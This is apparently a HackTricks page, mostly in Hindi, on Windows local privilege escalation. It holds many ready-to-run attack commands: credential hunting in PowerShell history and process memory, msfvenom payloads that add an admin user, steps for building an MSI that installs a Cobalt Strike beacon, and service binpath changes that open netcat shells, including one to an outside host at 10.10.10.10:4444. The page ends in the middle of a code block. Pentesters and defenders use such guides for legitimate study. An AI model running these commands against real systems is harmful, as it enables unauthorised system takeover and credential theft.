# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**यदि आप नहीं जानते कि Windows Access Tokens क्या हैं, तो जारी रखने से पहले निम्न पृष्ठ पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्न पृष्ठ देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**यदि आप नहीं जानते कि Windows में integrity levels क्या हैं, तो जारी रखने से पहले निम्न पृष्ठ पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows में विभिन्न चीज़ें हैं जो **prevent you from enumerating the system**, executables चलाने से रोक सकती हैं या यहाँ तक कि **detect your activities** भी कर सकती हैं। आपको निम्न **page** को **read** करना चाहिए और privilege escalation enumeration शुरू करने से पहले इन सभी **defenses** **mechanisms** को **enumerate** करना चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## System Info

### Version info enumeration

Check if the Windows version has any known vulnerability (check also the patches applied).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft security vulnerabilities के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस database में 4,700 से अधिक security vulnerabilities हैं, जो एक Windows environment द्वारा प्रस्तुत किए गए **massive attack surface** को दर्शाती हैं।

**सिस्टम पर**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas में watson निहित है)_

**स्थानीय रूप से सिस्टम जानकारी के साथ**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या कोई credential/Juicy info env variables में सहेजी गई है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

आप सीख सकते हैं कि इसे कैसे चालू किया जाए: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell पाइपलाइन निष्पादनों का विवरण रिकॉर्ड किया जाता है, जिनमें निष्पादित कमांड, कमांड आह्वान और स्क्रिप्ट के भाग शामिल हैं। हालाँकि, पूरा निष्पादन विवरण और आउटपुट परिणाम कैप्चर नहीं हो सकते हैं।

इसे सक्षम करने के लिए, दस्तावेज़ में "Transcript files" सेक्शन के निर्देशों का पालन करें, और **"Module Logging"** को चुनें **"Powershell Transcription"** के बजाय।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs के अंतिम 15 events देखने के लिए आप निम्नलिखित चला सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की एक पूर्ण गतिविधि और संपूर्ण सामग्री रिकॉर्ड कैप्चर की जाती है, जिससे यह सुनिश्चित होता है कि चलने के समय code का हर ब्लॉक दर्ज किया जाता है। यह प्रक्रिया प्रत्येक गतिविधि का एक व्यापक audit trail सुरक्षित रखती है, जो forensics और दुर्भावनापूर्ण व्यवहार के विश्लेषण के लिए मूल्यवान है। निष्पादन के समय सभी गतिविधियों का दस्तावेज़ीकरण करके, प्रक्रिया के बारे में विस्तृत अंतर्दृष्टि प्रदान की जाती है।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लिए लॉगिंग ईवेंट्स Windows Event Viewer में निम्न पथ पर पाए जा सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
आखिरी 20 ईवेंट देखने के लिए आप उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि अपडेट्स http**S** के माध्यम से नहीं बल्कि http का उपयोग करके अनुरोध किए जा रहे हों तो आप सिस्टम समझौता कर सकते हैं।

आप यह जांच करके शुरू करते हैं कि नेटवर्क non-SSL WSUS अपडेट का उपयोग कर रहा है या नहीं, cmd में निम्नलिखित चलाकर:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको इन में से किसी का उत्तर मिलता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
और यदि `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` या `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` का मान `1` के बराबर है।

तो, **यह शोषणयोग्य है।** यदि अंतिम registry का मान 0 के बराबर है, तो WSUS प्रविष्टि को अनदेखा कर दिया जाएगा।

इन कमजोरियों का शोषण करने के लिए आप इन टूल्स का उपयोग कर सकते हैं: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - ये MiTM weaponized exploit स्क्रिप्ट्स हैं जो non-SSL WSUS ट्रैफिक में 'fake' अपडेट इंजेक्ट करती हैं।

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
बुनियादी रूप से, यही वह दोष है जिसका यह बग शोषण करता है:

> यदि हमारे पास अपने local user proxy को संशोधित करने की शक्ति है, और Windows Updates Internet Explorer’s settings में कॉन्फ़िगर किए गए proxy का उपयोग करता है, तो हम लोकली [PyWSUS](https://github.com/GoSecure/pywsus) चला कर अपना ट्रैफिक इंटरसेप्ट कर सकते हैं और अपने asset पर एक elevated user के रूप में कोड चला सकते हैं।
>
> इसके अतिरिक्त, चूँकि WSUS सेवा current user’s settings का उपयोग करती है, यह उसके certificate store का भी उपयोग करेगी। यदि हम WSUS hostname के लिए एक self-signed certificate जनरेट करते हैं और इस сертификिफ़िकेट को current user की certificate store में जोड़ते हैं, तो हम HTTP और HTTPS दोनों WSUS ट्रैफिक को इंटरसेप्ट कर पाएँगे। WSUS सर्टिफिकेट पर trust-on-first-use प्रकार की वैलिडेशन लागू करने के लिए किसी HSTS-जैसी प्रणाली का उपयोग नहीं करता। यदि प्रस्तुत किया गया सर्टिफिकेट उपयोगकर्ता द्वारा विश्वसनीय है और उसमें सही hostname है, तो सेवा उसे स्वीकार कर लेगी।

आप इस vulnerability का शोषण [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) टूल का उपयोग करके कर सकते हैं (एक बार जब यह रिलीज़ हो जाए)।

## तीसरे-पक्ष Auto-Updaters और Agent IPC (local privesc)

कई enterprise agents लोकलहोस्ट IPC surface और एक privileged update चैनल एक्सपोज़ करते हैं। यदि enrollment को एक attacker server पर मजबूर किया जा सके और updater किसी rogue root CA पर भरोसा कर ले या कमजोर signer चेक हों, तो एक local user एक malicious MSI प्रदान कर सकता है जिसे SYSTEM service इंस्टॉल कर देगी। सामान्यीकृत तकनीक (Netskope stAgentSvc chain – CVE-2025-0309 पर आधारित) यहाँ देखें:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Windows **domain** वातावरणों में विशिष्ट परिस्थितियों के तहत एक **local privilege escalation** vulnerability मौजूद है। इन परिस्थितियों में वे वातावरण शामिल हैं जहाँ **LDAP signing is not enforced**, उपयोगकर्ताओं के पास self-rights होते हैं जो उन्हें **Resource-Based Constrained Delegation (RBCD)** को कॉन्फ़िगर करने की अनुमति देते हैं, और उपयोगकर्ताओं के पास domain में कंप्यूटर बनाने की क्षमता होती है। यह ध्यान देने योग्य है कि ये **requirements** डिफ़ॉल्ट सेटिंग्स के साथ पूरी होती हैं।

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** ये 2 रजिस्ट्री एंट्रियाँ **enabled** (value is **0x1**) हैं, तो किसी भी privilege वाले उपयोगकर्ता `*.msi` फाइलें NT AUTHORITY\\**SYSTEM** के रूप में **install** (execute) कर सकता/सकती है।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास एक meterpreter session है तो आप इस तकनीक को मॉड्यूल **`exploit/windows/local/always_install_elevated`** का उपयोग करके स्वचालित कर सकते हैं

### PowerUP

power-up से `Write-UserAddMSI` कमांड का उपयोग करके वर्तमान निर्देशिका में privileges बढ़ाने के लिए एक Windows MSI बाइनरी बनाएं। यह स्क्रिप्ट एक precompiled MSI installer लिखती है जो user/group addition के लिए prompt करता है (इसलिए आपको GIU access की आवश्यकता होगी):
```
Write-UserAddMSI
```
Just execute the created binary to escalate privileges.

### MSI Wrapper

Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX के साथ MSI बनाएं


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio के साथ MSI बनाना

- **Generate** Cobalt Strike या Metasploit का उपयोग करके `C:\privesc\beacon.exe` में एक **new Windows EXE TCP payload** रखें
- **Visual Studio** खोलें, **Create a new project** चुनें और सर्च बॉक्स में "installer" टाइप करें। **Setup Wizard** प्रोजेक्ट चुनें और **Next** पर क्लिक करें।
- प्रोजेक्ट को एक नाम दें, जैसे **AlwaysPrivesc**, लोकेशन के लिए **`C:\privesc`** उपयोग करें, **place solution and project in the same directory** चुनें, और **Create** पर क्लिक करें।
- **Next** पर क्लिक करते रहें जब तक आप step 3 of 4 तक नहीं पहुँचते (choose files to include)। **Add** पर क्लिक करें और अभी बनाया गया Beacon payload चुनें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** प्रोजेक्ट को हाईलाइट करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- आप अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जो इंस्टॉल की गई ऐप को अधिक legitimate दिखा सकते हैं।
- प्रोजेक्ट पर right-click करें और **View > Custom Actions** चुनें।
- **Install** पर right-click करें और **Add Custom Action** चुनें।
- **Application Folder** पर double-click करें, अपनी **beacon.exe** फ़ाइल चुनें और **OK** क्लिक करें। इससे सुनिश्चित होगा कि installer चलने पर तुरंत beacon payload executed होगा।
- **Custom Action Properties** के तहत **Run64Bit** को **True** में बदलें।
- अंत में, **build it**।
- यदि चेतावनी `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो सुनिश्चित करें कि आपने platform को x64 पर सेट किया है।

### MSI इंस्टॉलेशन

मैलिशियस `.msi` फ़ाइल की **installation** background में execute करने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
इस भेद्यता का शोषण करने के लिए आप उपयोग कर सकते हैं: _exploit/windows/local/always_install_elevated_

## एंटीवायरस और डिटेक्टर्स

### ऑडिट सेटिंग्स

ये सेटिंग्स तय करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना दिलचस्प है कि logs कहाँ भेजे जाते हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** का उद्देश्य **management of local Administrator passwords** के लिए है, यह सुनिश्चित करता है कि domain में जुड़े कंप्यूटरों पर प्रत्येक पासवर्ड **unique, randomised, and regularly updated** हो। ये पासवर्ड Active Directory में सुरक्षित रूप से संग्रहीत होते हैं और केवल उन उपयोगकर्ताओं द्वारा एक्सेस किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त अनुमति दी गई हो, जिससे वे अधिकृत होने पर local admin passwords देख सकें।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि सक्रिय हो, तो **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** से शुरू होकर, Microsoft ने Local Security Authority (LSA) के लिए सुरक्षा बढ़ाई ताकि अविश्वसनीय प्रक्रियाओं द्वारा **इसकी मेमोरी पढ़ने** या कोड इंजेक्ट करने के प्रयासों को **ब्लॉक** किया जा सके, जिससे सिस्टम और अधिक सुरक्षित हो।\
[**LSA Protection के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहीत credentials को pass-the-hash जैसे खतरों से सुरक्षित रखना है.| [**Credentials Guard के बारे में अधिक जानकारी यहाँ।**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** को **Local Security Authority** (LSA) द्वारा प्रमाणित किया जाता है और ऑपरेटिंग सिस्टम घटकों द्वारा उपयोग किए जाते हैं। जब किसी उपयोगकर्ता के logon data को किसी registered security package द्वारा प्रमाणीकृत किया जाता है, तो आम तौर पर उस उपयोगकर्ता के लिए domain credentials स्थापित किए जाते हैं।\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## उपयोगकर्ता और समूह

### उपयोगकर्ताओं और समूहों की सूची बनाना

आपको यह जांचना चाहिए कि क्या जिन समूहों के आप सदस्य हैं उनमें से किसी के पास रोचक अनुमतियाँ हैं
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

यदि आप किसी Privileged group के सदस्य हैं तो आप privileges escalate कर सकते हैं। Privileged groups और इन्हें abuse करके privileges escalate करने के बारे में यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**और अधिक जानें** कि एक **token** क्या है इस पृष्ठ पर: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
निम्नलिखित पृष्ठ देखें ताकि आप **रोचक tokens** और उन्हें दुरुपयोग करने के तरीकों के बारे में जान सकें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### होम फ़ोल्डर्स
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## चल रहे प्रोसेस

### फ़ाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, प्रोसेस सूचीबद्ध करते समय **प्रोसेस की कमांड लाइन के अंदर पासवर्ड देखें**.\
जाँचें कि क्या आप **कोई चल रही बाइनरी ओवरराइट कर सकते हैं** या क्या आपके पास बाइनरी फ़ोल्डर में लिखने की अनुमति है ताकि संभव [**DLL Hijacking attacks**](dll-hijacking/index.html) का फायदा उठाया जा सके:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा जांचें कि संभवतः [**electron/cef/chromium debuggers** चल रहे हैं — आप उनका दुरुपयोग कर escalate privileges कर सकते हैं](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**प्रोसेस की बाइनरी फ़ाइलों के permissions की जाँच**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रोसेस बाइनरीज़ के फ़ोल्डरों की अनुमतियों की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

आप sysinternals के **procdump** का उपयोग करके किसी running process का memory dump बना सकते हैं। FTP जैसे services की memory में अक्सर **credentials in clear text in memory** होते हैं — memory dump करके इन credentials को पढ़ने की कोशिश करें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चलने वाली एप्लिकेशन उपयोगकर्ता को CMD खोलने या डायरेक्टरी ब्राउज़ करने की अनुमति दे सकती हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" खोजें, "Click to open Command Prompt" पर क्लिक करें

## सेवाएँ

Service Triggers Windows को तब एक service शुरू करने देते हैं जब कुछ शर्तें उत्पन्न होती हैं (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, आदि)। SERVICE_START rights के बिना भी आप अक्सर उनके triggers फायर करके privileged services शुरू कर सकते हैं। enumeration और activation techniques यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

सेवाओं की सूची प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप किसी सेवा की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं।
```bash
sc qc <service_name>
```
प्रत्येक सेवा के लिए आवश्यक विशेषाधिकार स्तर की जाँच करने के लिए _Sysinternals_ का बाइनरी **accesschk** होना सुझाया जाता है।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
यह अनुशंसा की जाती है कि जांचें कि "Authenticated Users" किसी भी सेवा को संशोधित कर सकते हैं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[आप यहाँ से accesschk.exe (XP के लिए) डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सर्विस सक्षम करें

यदि आपको यह त्रुटि आ रही है (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

आप इसे सक्षम करने के लिए निम्नलिखित का उपयोग कर सकते हैं:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान रखें कि सेवा upnphost काम करने के लिए SSDPSRV पर निर्भर है (XP SP1 के लिए)**

**इस समस्या का एक अन्य उपाय निम्नलिखित को चलाना है:**
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

ऐसी स्थिति में जहाँ "Authenticated users" समूह के पास किसी service पर **SERVICE_ALL_ACCESS** है, सर्विस के executable binary में संशोधन संभव है। सर्विस बाइनरी को बदलने और **sc** को चलाने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनरारंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
कई अनुमतियों के माध्यम से विशेषाधिकार बढ़ाए जा सकते हैं:

- **SERVICE_CHANGE_CONFIG**: service binary को पुनः कॉन्फ़िगर करने की अनुमति देता है।
- **WRITE_DAC**: अनुमतियों के पुनः कॉन्फ़िगरेशन को सक्षम करता है, जिससे service configurations बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: स्वामित्व प्राप्त करने और अनुमतियों को पुनः कॉन्फ़िगर करने की अनुमति देता है।
- **GENERIC_WRITE**: service configurations बदलने की क्षमता प्रदान करता है।
- **GENERIC_ALL**: service configurations बदलने की क्षमता भी प्रदान करता है।

इस vulnerability का पता लगाने और शोषण करने के लिए, _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services binaries कमजोर अनुमतियाँ

**जाँचें कि क्या आप उस बाइनरी को संशोधित कर सकते हैं जो किसी service द्वारा चलायी जाती है** या क्या आपके पास उस फ़ोल्डर पर **लिखने की अनुमतियाँ** हैं जहाँ बाइनरी स्थित है ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
आप wmic (not in system32) का उपयोग करके किसी service द्वारा execute की जाने वाली प्रत्येक बाइनरी प्राप्त कर सकते हैं और अपनी अनुमतियाँ जांचने के लिए icacls का उपयोग कर सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का उपयोग भी कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### सर्विस रजिस्ट्री संशोधन अनुमतियाँ

आपको जांचना चाहिए कि क्या आप किसी भी सर्विस रजिस्ट्री को संशोधित कर सकते हैं.\
आप अपनी **अनुमतियाँ** किसी सर्विस **रजिस्ट्री** पर **जाँच** कर सकते हैं, इस तरह:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
जांचना चाहिए कि क्या **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` permissions हैं। यदि हाँ, तो service द्वारा execute की जाने वाली binary को बदला जा सकता है।

Binary के execute किए जाने वाले Path को बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास किसी registry पर यह permission है तो इसका मतलब है कि आप इस registry से उप-registries बना सकते हैं। Windows services के मामले में यह पर्याप्त है to execute arbitrary code:

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी executable का path quotes के अंदर नहीं है, तो Windows space से पहले वाले हर ending को execute करने की कोशिश करेगा।

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
built-in Windows services से संबंधित नहीं होने वाले सभी unquoted service paths सूचीबद्ध करें:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
